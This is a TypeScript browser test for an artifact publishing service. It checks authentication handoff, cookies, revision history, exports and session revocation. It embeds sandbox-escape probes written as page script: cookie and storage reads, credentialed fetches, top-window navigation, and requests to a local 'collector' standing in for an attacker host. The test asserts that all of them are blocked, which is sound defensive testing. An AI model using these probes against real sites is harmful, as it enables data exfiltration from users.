import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import { randomBytes } from 'node:crypto';
import { once } from 'node:events';
import { mkdir, readFile } from 'node:fs/promises';
import { createServer } from 'node:net';
import { createServer as createHttpServer } from 'node:http';
import { serve } from '@hono/node-server';
import { eq } from 'drizzle-orm';
import { unzipSync, strFromU8 } from 'fflate';
import { chromium, type Browser } from 'playwright';
import { createArtifactStore } from '../packages/artifacts/src/index.ts';
import { session } from '../packages/db/src/schema.ts';
import { createPublicationApp } from '../apps/publication/src/http.ts';
import { fixture } from './helpers.ts';

const reservation = createServer().listen(0, '127.0.0.1');
await once(reservation, 'listening');
const address = reservation.address();
assert(address && typeof address === 'object');
await new Promise<void>((resolve) => reservation.close(() => resolve()));
const dashboard = `http://localhost:${address.port}`;
let publicationHandler = async (_request: Request) => new Response(null, { status: 503 });
const publicationServer = serve({ fetch: (request) => publicationHandler(request), hostname: '::1', port: 0 });
await once(publicationServer, 'listening');
const publicationAddress = publicationServer.address();
assert(publicationAddress && typeof publicationAddress === 'object');
const publish = `http://[::1]:${publicationAddress.port}`;
const app = await fixture({ dashboard });
const collected: string[] = [];
const collector = createHttpServer((request, response) => { collected.push(request.url ?? ''); response.end('Collected'); }).listen(0, '127.0.0.1');
await once(collector, 'listening');
const collectorAddress = collector.address();
assert(collectorAddress && typeof collectorAddress === 'object');
const collectorUrl = `http://127.0.0.1:${collectorAddress.port}/collect?bytes=retained-document`;
const collectorOrigin = new URL(collectorUrl).origin;
const serviceSecret = randomBytes(32).toString('hex');
const cookieSecret = randomBytes(32).toString('hex');
publicationHandler = createPublicationApp({ DASHBOARD_URL: dashboard, PUBLISH_URL: publish, PUBLICATION_SERVICE_SECRET: serviceSecret, PUBLICATION_COOKIE_SECRET: cookieSecret });
const store = createArtifactStore(app.db, { publishOrigin: publish });
const central = await app.db.select().from(session).where(eq(session.userId, app.ownerId)).get();
assert(central);
const actor = { userId: app.ownerId, sessionId: central.id, clientId: 'claude-fixture', scopes: ['artifacts:read', 'artifacts:write', 'artifacts:publish'] };
const originalText = '<h1>Original document</h1><p>Revision one survives later publication.</p>';
const originalBytes = Buffer.concat([Buffer.from([0, 1, 255]), Buffer.from('<script>window.top.document.body.dataset.attachmentExecuted = "yes"</script>')]);
const created = await store.create(actor, { requestId: randomBytes(16).toString('hex'), snapshot: { metadata: { title: 'Browser proof artifact', description: 'Complete retained snapshots', custom: { retained: true } }, content: { kind: 'html', text: originalText }, files: [{ path: 'nested/file.html', mediaType: 'text/html', encoding: 'base64', data: originalBytes.toString('base64') }] } });
const firstPublication = await store.publish(actor, { requestId: randomBytes(16).toString('hex'), artifactId: created.artifactId, revisionId: created.revision.id, expectedPublicationVersion: 0 });
const client = await app.auth.api.adminCreateOAuthClient({ headers: new Headers({ cookie: app.cookie }), body: { client_name: 'Artifact proof dashboard', application_type: 'native', redirect_uris: [`${dashboard}/auth/callback`], token_endpoint_auth_method: 'client_secret_basic', grant_types: ['authorization_code'], response_types: ['code'], scope: 'openid profile', enable_end_session: true, skip_consent: true, require_pkce: true } });
assert(client.client_secret);
const child = spawn(process.execPath, ['apps/dashboard/dist/server/entry.mjs'], {
  env: { PATH: process.env.PATH, DATABASE_URL: app.databaseUrl, DATABASE_AUTH_TOKEN: '', AUTH_URL: app.config.origin, MCP_URL: app.config.resource, DASHBOARD_URL: dashboard, PUBLISH_URL: publish, PUBLICATION_SERVICE_SECRET: serviceSecret, PUBLICATION_COOKIE_SECRET: cookieSecret, PANEL_CLIENT_ID: client.client_id, PANEL_CLIENT_SECRET: client.client_secret, PORT: String(address.port), HOST: '127.0.0.1' },
  stdio: ['ignore', 'pipe', 'pipe'],
});
let startupError = '';
child.stderr.on('data', (data: Buffer) => { startupError += data.toString(); });
let browser: Browser | undefined;
try {
  let ready = false;
  for (let attempt = 0; attempt < 50; attempt++) {
    if (child.exitCode !== null) throw new Error(`Dashboard startup failed: ${startupError.slice(0, 300)}`);
    ready = await fetch(dashboard).then((response) => response.ok).catch(() => false);
    if (ready) break;
    await new Promise((resolve) => setTimeout(resolve, 100));
  }
  assert(ready, `Built panel starts: ${startupError.slice(0, 300)}`);
  const deniedService = await fetch(`${dashboard}/internal/publication/read`, { method: 'POST', headers: { origin: dashboard, 'content-type': 'application/json' }, body: '{}' });
  assert.equal(deniedService.status, 403);
  const deniedWithBrowserOrigin = await fetch(`${dashboard}/internal/publication/consume`, { method: 'POST', headers: { origin: dashboard, authorization: 'Bearer incorrect', 'content-type': 'application/json' }, body: '{}' });
  assert.equal(deniedWithBrowserOrigin.status, 403);
  for (const endpoint of ['read', 'consume']) {
    const deniedAlias = await fetch(`${dashboard}/internal/publication/${endpoint}/`, { method: 'POST', headers: { origin: dashboard, 'content-type': 'application/json' }, body: '{}' });
    assert.equal(deniedAlias.status, 403);
  }
  const authenticatedWithoutOrigin = await fetch(`${dashboard}/internal/publication/read`, { method: 'POST', headers: { authorization: `Bearer ${serviceSecret}`, 'content-type': 'application/json' }, body: '{}' });
  assert.equal(authenticatedWithoutOrigin.status, 400);
  browser = await chromium.launch({ channel: 'chrome' });
  const context = await browser.newContext({ viewport: { width: 1280, height: 900 } });
  const page = await context.newPage();
  const callbackRequest = page.waitForRequest((request) => new URL(request.url()).origin === publish && new URL(request.url()).pathname === '/callback');
  await page.goto(firstPublication.url);
  await page.getByLabel('Correo electrónico').fill('owner@example.test');
  await page.getByLabel('Contraseña').fill(app.password);
  await page.getByRole('button', { name: 'Iniciar sesión', exact: true }).click();
  await page.waitForURL(firstPublication.url);
  await page.frameLocator('iframe').getByRole('heading', { name: 'Original document', exact: true }).waitFor();
  assert.equal(new URL(page.url()).search, '');
  const viewerCookies = (await context.cookies(publish)).filter((cookie) => cookie.name.startsWith('__Host-artifacts-viewer-'));
  assert.equal(viewerCookies.length, 1);
  assert(viewerCookies[0]!.httpOnly && viewerCookies[0]!.secure);
  assert.equal(viewerCookies[0]!.domain, '[::1]');
  assert(!(await context.cookies(publish)).some((cookie) => cookie.name.includes('transaction')));
  const callback = await callbackRequest;
  const callbackUrl = callback.url();
  const transactionCookie = await callback.headerValue('cookie');
  assert(transactionCookie);
  assert.equal((await fetch(callbackUrl, { headers: { cookie: transactionCookie }, redirect: 'manual' })).status, 403);
  assert.equal((await fetch(callbackUrl, { redirect: 'manual' })).status, 403);
  const oldAttachment = new URL((await page.getByRole('link', { name: 'nested/file.html', exact: true }).getAttribute('href'))!, publish).href;
  const downloadEvent = page.waitForEvent('download');
  await page.getByRole('link', { name: 'nested/file.html', exact: true }).click();
  const download = await downloadEvent;
  await mkdir('.test-artifacts', { recursive: true });
  await download.saveAs('.test-artifacts/publication-file.bin');
  assert.deepEqual(await readFile('.test-artifacts/publication-file.bin'), originalBytes);
  assert.equal(await page.locator('body').getAttribute('data-attachment-executed'), null);
  const html = `<h1>Updated document</h1><button id="navigate">Navigation probe</button><pre id="proof">pending</pre><pre id="violations"></pre><script>
  document.addEventListener('securitypolicyviolation', (event) => { document.getElementById('violations').textContent += JSON.stringify({ directive: event.effectiveDirective, uri: event.blockedURI }) + '\\n'; });
  document.getElementById('navigate').onclick = () => { location.href = ${JSON.stringify(collectorUrl)}; };
  (async () => {
    const results = {};
    try { parent.document.body.dataset.escaped = 'yes'; results.parent = 'allowed'; } catch { results.parent = 'blocked'; }
    try { results.cookies = document.cookie ? 'allowed' : 'empty'; } catch { results.cookies = 'blocked'; }
    try { localStorage.setItem('escape', 'yes'); results.storage = 'allowed'; } catch { results.storage = 'blocked'; }
    for (const [name, url] of [['authenticatedFetch', ${JSON.stringify(`${dashboard}/artifacts/${created.artifactId}/export?revisionId=${created.revision.id}`)}], ['externalFetch', ${JSON.stringify(`${collectorOrigin}/fetch`)}]]) {
      try { await fetch(url, { credentials: 'include' }); results[name] = 'allowed'; } catch { results[name] = 'blocked'; }
    }
    await new Promise((resolve) => {
      try {
        const worker = new Worker('data:text/javascript,postMessage(1)');
        worker.onmessage = () => { results.worker = 'allowed'; worker.terminate(); resolve(); };
        worker.onerror = (event) => { event.preventDefault(); results.worker = 'blocked'; worker.terminate(); resolve(); };
      } catch { results.worker = 'blocked'; resolve(); }
    });
    results.popup = window.open(${JSON.stringify(`${collectorOrigin}/popup`)}) ? 'allowed' : 'blocked';
    try { top.location = ${JSON.stringify(`${collectorOrigin}/escape`)}; results.top = 'allowed'; } catch { results.top = 'blocked'; }
    const image = new Image(); image.src = ${JSON.stringify(`${collectorOrigin}/image`)}; document.body.append(image);
    const script = document.createElement('script'); script.src = ${JSON.stringify(`${collectorOrigin}/script`)}; document.body.append(script);
    const form = document.createElement('form'); form.action = ${JSON.stringify(`${collectorOrigin}/form`)}; document.body.append(form); form.submit();
    const frame = document.createElement('iframe'); frame.src = ${JSON.stringify(`${collectorOrigin}/frame`)}; document.body.append(frame);
    parent.postMessage({ type: 'read-credentials', url: ${JSON.stringify(`${collectorOrigin}/message`)} }, '*');
    document.getElementById('proof').textContent = JSON.stringify(results);
  })();
  </script>`;
  const updated = await store.update({ ...actor, clientId: 'codex-fixture' }, { requestId: randomBytes(16).toString('hex'), artifactId: created.artifactId, expectedRevisionId: created.revision.id, snapshot: { metadata: { title: 'Browser proof artifact', description: 'Second complete snapshot' }, content: { kind: 'html', text: html }, files: [{ path: 'nested/file.html', mediaType: 'text/html', encoding: 'utf8', data: '<h1>Second attachment</h1>' }] } });
  const secondPublication = await store.publish({ ...actor, clientId: 'codex-fixture' }, { requestId: randomBytes(16).toString('hex'), artifactId: created.artifactId, revisionId: updated.revision.id, expectedPublicationVersion: firstPublication.version });
  assert.equal(secondPublication.url, firstPublication.url);
  const forbiddenRequests: string[] = [];
  page.on('requestfinished', (request) => { if (request.url().startsWith(collectorOrigin) || request.url().startsWith(`${dashboard}/artifacts/`)) forbiddenRequests.push(request.url()); });
  const publishedResponse = await page.goto(secondPublication.url);
  assert.equal(publishedResponse?.status(), 200);
  assert.equal(publishedResponse?.headers()['cache-control'], 'private, no-store');
  await page.frameLocator('iframe').getByRole('heading', { name: 'Updated document', exact: true }).waitFor();
  await page.frameLocator('iframe').locator('#proof').filter({ hasText: 'blocked' }).waitFor();
  const results = JSON.parse((await page.frameLocator('iframe').locator('#proof').textContent())!) as Record<string, string>;
  assert.deepEqual(results, { parent: 'blocked', cookies: 'blocked', storage: 'blocked', authenticatedFetch: 'blocked', externalFetch: 'blocked', worker: 'blocked', popup: 'blocked', top: 'blocked' });
  await page.frameLocator('iframe').locator('#violations').filter({ hasText: 'script-src-elem' }).waitFor();
  const violations = (await page.frameLocator('iframe').locator('#violations').textContent())!.trim().split('\n').map((line) => JSON.parse(line) as { directive: string; uri: string });
  assert(violations.some((event) => event.directive === 'connect-src' && event.uri.startsWith(`${dashboard}/artifacts/`)));
  assert(violations.some((event) => event.directive === 'connect-src' && event.uri === `${collectorOrigin}/fetch`));
  assert(violations.some((event) => event.directive === 'worker-src'));
  assert(violations.some((event) => event.directive === 'img-src'));
  assert(violations.some((event) => event.directive === 'frame-src'));
  assert.deepEqual(forbiddenRequests, []);
  assert.equal(await page.locator('iframe').getAttribute('sandbox'), 'allow-scripts');
  assert.equal(await page.locator('body').getAttribute('data-escaped'), null);
  assert.equal(page.url(), secondPublication.url);
  await page.frameLocator('iframe').getByRole('button', { name: 'Navigation probe', exact: true }).click();
  await page.waitForTimeout(100);
  assert.deepEqual(collected, []);
  const viewerHeader = viewerCookies.map((cookie) => `${cookie.name}=${cookie.value}`).join('; ');
  assert.equal((await fetch(oldAttachment, { headers: { cookie: viewerHeader }, redirect: 'manual' })).status, 403);
  const attachment = new URL((await page.getByRole('link', { name: 'nested/file.html', exact: true }).getAttribute('href'))!, publish).href;
  const currentDownload = await fetch(attachment, { headers: { cookie: viewerHeader } });
  assert.equal(currentDownload.status, 200);
  assert.equal(await currentDownload.text(), '<h1>Second attachment</h1>');
  assert.match(currentDownload.headers.get('content-disposition')!, /^attachment;/);
  assert.equal(currentDownload.headers.get('x-content-type-options'), 'nosniff');
  const panel = await context.newPage();
  await panel.goto(dashboard);
  await panel.getByRole('link', { name: 'Browser proof artifact', exact: true }).click();
  await panel.getByRole('heading', { name: 'Historial', exact: true }).waitFor();
  assert.equal(await panel.locator('.revision-list li').count(), 2);
  assert(await panel.getByRole('link', { name: 'Ver revisión 1', exact: true }).count());
  assert(await panel.getByRole('link', { name: 'Ver revisión 2', exact: true }).count());
  assert.match((await panel.request.get(panel.url())).headers()['content-security-policy']!, /frame-src 'self'/);
  await panel.frameLocator('.preview').getByRole('button', { name: 'Navigation probe', exact: true }).click();
  await panel.waitForTimeout(100);
  assert.deepEqual(collected, []);
  const directPreview = await context.newPage();
  const previewDenied = await directPreview.goto(`${dashboard}/artifacts/${created.artifactId}/preview?revisionId=${updated.revision.id}`);
  assert.equal(previewDenied?.status(), 403);
  assert.equal(await directPreview.locator('script').count(), 0);
  await directPreview.close();
  await panel.getByRole('link', { name: 'Ver revisión 1', exact: true }).click();
  await panel.frameLocator('.preview').getByRole('heading', { name: 'Original document', exact: true }).waitFor();
  const exportEvent = panel.waitForEvent('download');
  await panel.getByRole('link', { name: 'Descargar revisión 1', exact: true }).first().click();
  const archive = await exportEvent;
  await archive.saveAs('.test-artifacts/revision-one.zip');
  const members = unzipSync(await readFile('.test-artifacts/revision-one.zip'));
  assert.equal(strFromU8(members['content.html']!), originalText);
  assert.deepEqual(Buffer.from(members['files/nested/file.html']!), originalBytes);
  const manifest = JSON.parse(strFromU8(members['artifact.json']!)) as { artifactId: string; revision: { id: string }; metadata: { custom: { retained: boolean } } };
  assert.equal(manifest.artifactId, created.artifactId);
  assert.equal(manifest.revision.id, created.revision.id);
  assert.equal(manifest.metadata.custom.retained, true);
  await panel.setViewportSize({ width: 390, height: 844 });
  await panel.evaluate(async () => {
    await document.fonts.ready;
    await new Promise<void>((resolve) => requestAnimationFrame(() => requestAnimationFrame(() => resolve())));
  });
  assert.equal(await panel.locator('header').count(), 1);
  assert.equal(await panel.locator('h1').count(), 1);
  assert(await panel.evaluate(() => document.documentElement.scrollWidth <= innerWidth));
  await panel.screenshot({ path: '.test-artifacts/artifact-history-mobile.png', fullPage: true });
  const anonymous = await browser.newContext();
  const anonymousPage = await anonymous.newPage();
  await anonymousPage.goto(secondPublication.url);
  await anonymousPage.getByLabel('Correo electrónico').waitFor();
  assert.equal(await anonymousPage.locator('iframe').count(), 0);
  assert.equal((await anonymous.request.get(attachment, { maxRedirects: 0 })).status(), 401);
  assert.equal((await anonymous.request.get(`${dashboard}/artifacts/${created.artifactId}/export?revisionId=${created.revision.id}`)).status(), 401);
  await anonymous.close();
  await panel.goto(dashboard);
  await panel.getByRole('link', { name: 'Cerrar todas las sesiones', exact: true }).click();
  await panel.getByRole('button', { name: 'Cerrar todas las sesiones', exact: true }).click();
  await panel.getByRole('link', { name: 'Iniciar sesión', exact: true }).waitFor();
  const revokedDocument = await fetch(secondPublication.url, { headers: { cookie: viewerHeader }, redirect: 'manual' });
  const revokedAttachment = await fetch(attachment, { headers: { cookie: viewerHeader }, redirect: 'manual' });
  assert.equal(revokedDocument.status, 403);
  assert.equal(revokedAttachment.status, 403);
  assert(!(await revokedDocument.text()).includes('Updated document'));
  assert(!(await revokedAttachment.text()).includes('Second attachment'));
  const beforeOutage = publicationHandler;
  publicationHandler = createPublicationApp({ DASHBOARD_URL: dashboard, PUBLISH_URL: publish, PUBLICATION_SERVICE_SECRET: serviceSecret, PUBLICATION_COOKIE_SECRET: cookieSecret }, async () => { throw new Error('Backend disconnected'); });
  assert.equal((await fetch(secondPublication.url, { headers: { cookie: viewerHeader }, redirect: 'manual' })).status, 503);
  publicationHandler = beforeOutage;
  console.log('Artifact browser proof passed. Stable publication, clean one-use handoff, sandbox isolation, exact historical export, revision-bound attachments, mobile layout, anonymous denial, central revocation and backend outage.');
} finally {
  await browser?.close();
  child.kill('SIGTERM');
  if (child.exitCode === null) await once(child, 'exit');
  if ('closeAllConnections' in publicationServer) publicationServer.closeAllConnections();
  await new Promise<void>((resolve) => publicationServer.close(() => resolve()));
  collector.closeAllConnections();
  await new Promise<void>((resolve) => collector.close(() => resolve()));
  await app.close();
}
